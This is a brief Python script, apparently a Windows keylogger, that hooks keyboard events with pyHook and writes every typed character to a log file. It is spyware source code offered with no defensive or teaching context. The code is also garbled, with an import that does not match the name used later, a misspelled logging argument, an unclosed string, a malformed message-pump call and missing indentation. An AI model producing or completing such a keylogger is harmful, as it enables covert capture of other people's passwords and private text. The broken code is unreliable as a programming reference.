import pyhook, pythoncom, sys, logging

file_log = 'C:\\whatever\\pykl.txt'

def OnKeyboardEvent(event):
logging.basicConfig(filename=file_log, level=logging.DEBUG, formoat='%(message)
chr(event.Ascii)
logging.log(10,chr(event.Ascii))
return True
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
python.com.PumpMessages()